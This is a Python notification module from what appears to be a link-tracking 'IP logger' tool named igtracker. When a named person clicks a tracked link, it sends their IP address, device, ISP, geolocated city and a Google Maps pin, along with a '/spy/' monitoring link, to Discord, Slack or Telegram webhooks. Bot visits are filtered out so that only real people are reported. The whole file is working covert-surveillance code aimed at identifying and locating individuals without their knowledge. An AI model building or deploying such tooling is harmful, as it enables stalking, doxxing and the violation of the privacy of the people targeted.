"""ヒット即時通知。Discord / Slack / Telegram。

環境変数:
  NOTIFY_WEBHOOK        Discord Webhook URL
  NOTIFY_SLACK          Slack Incoming Webhook URL
  NOTIFY_TELEGRAM_TOKEN Telegram Bot Token
  NOTIFY_TELEGRAM_CHAT  Telegram chat_id
  NOTIFY_BASE           自分のURL（通知に監視室リンクを載せる）
  NOTIFY_SKIP_BOT       1 でボットを除外（既定1）
  NOTIFY_MIN_SEC        連投抑止の最小秒数（既定0＝全通）
"""
from __future__ import annotations

import os, threading, time

import requests

_LOCK = threading.RLock()
_LAST = {"t": 0.0}


def _e(k, d=""):
    return (os.getenv(k) or d).strip()


def enabled():
    return bool(_e("NOTIFY_WEBHOOK") or _e("NOTIFY_SLACK")
                or (_e("NOTIFY_TELEGRAM_TOKEN") and _e("NOTIFY_TELEGRAM_CHAT")))


def _send(text):
    wh = _e("NOTIFY_WEBHOOK")
    if wh:
        try:
            requests.post(wh, json={"content": text[:1900],
                                    "username": _e("NOTIFY_NAME", "igtracker")},
                          timeout=10)
        except Exception:
            pass
    sl = _e("NOTIFY_SLACK")
    if sl:
        try:
            requests.post(sl, json={"text": text}, timeout=10)
        except Exception:
            pass
    tk, ch = _e("NOTIFY_TELEGRAM_TOKEN"), _e("NOTIFY_TELEGRAM_CHAT")
    if tk and ch:
        try:
            requests.post(f"https://api.telegram.org/bot{tk}/sendMessage",
                          json={"chat_id": ch, "text": text}, timeout=10)
        except Exception:
            pass


def hit_async(code, hit_id, request, link):
    if not enabled():
        return
    threading.Thread(target=_hit, args=(code, hit_id, request, link),
                     daemon=True).start()


def _hit(code, hit_id, request, link):
    try:
        from . import linktrack
        ip = linktrack.client_ip(request)
        p = linktrack.parse_ua(request.headers.get("user-agent", ""))
        g = linktrack.geo(ip)
        if p["is_bot"] and _e("NOTIFY_SKIP_BOT", "1") != "0":
            return
        now = time.time()
        mn = float(_e("NOTIFY_MIN_SEC", "0") or 0)
        with _LOCK:
            if mn and now - _LAST["t"] < mn:
                return
            _LAST["t"] = now

        name = (link["person"] or link["name"] or code) if link else code
        base = _e("NOTIFY_BASE").rstrip("/")
        extra = ""
        if g.get("lat") is not None:
            extra = (f"\nIP位置: {g.get('city') or '-'} {g.get('region') or '-'} "
                     f"{g.get('country') or '-'}")
        text = (
            f"【リンク踏み】{name}\n"
            f"code: {code}\n"
            f"端末: {p['device']} / {p['os']} / {p['browser']}"
            f"{' (アプリ内)' if p['inapp'] else ''}\n"
            f"IP: {ip}\n"
            f"回線: {g.get('isp') or '-'} / {g.get('asn') or '-'}{extra}\n"
            f"時刻: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        if base:
            text += f"\n監視室: {base}/spy/{code}"
        if g.get("lat") is not None:
            text += f"\n地図: https://www.google.com/maps?q={g['lat']},{g['lon']}"
        _send(text)
    except Exception:
        pass